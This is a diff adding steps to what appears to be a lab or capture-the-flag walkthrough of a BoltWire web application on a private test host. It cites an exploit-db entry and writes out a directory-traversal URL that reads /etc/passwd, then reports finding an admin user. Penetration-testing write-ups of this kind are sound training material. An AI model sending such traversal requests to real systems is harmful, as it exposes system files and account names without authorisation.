@@ -108,10 +108,23 @@ Username: tester
 
 <img width="1193" height="454" alt="image" src="https://github.com/user-attachments/assets/cb2518b3-1e79-493a-878a-6b638daa4473" />
 
+- BoltWire is an easy to use web development system with flexibility and power. 
 - I will then search for boltwire version exploitation hoping to find any known vulnerability for it.
 https://www.exploit-db.com/exploits/48411 
 
   <img width="1176" height="872" alt="image" src="https://github.com/user-attachments/assets/575eed32-4962-487c-a9d8-b7b706056930" />
+
+
+```bash
+http://192.168.38.140:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
+```
+
+<img width="1184" height="985" alt="image" src="https://github.com/user-attachments/assets/d9c3df5d-89c1-4261-88b9-6bae03b91b89" />
+
+We were able to access the /etc/passwd and found a new Admin User **jeanpaul** that may help us later.
+
+
+**3- NFS Enumeration:**
 
 
   
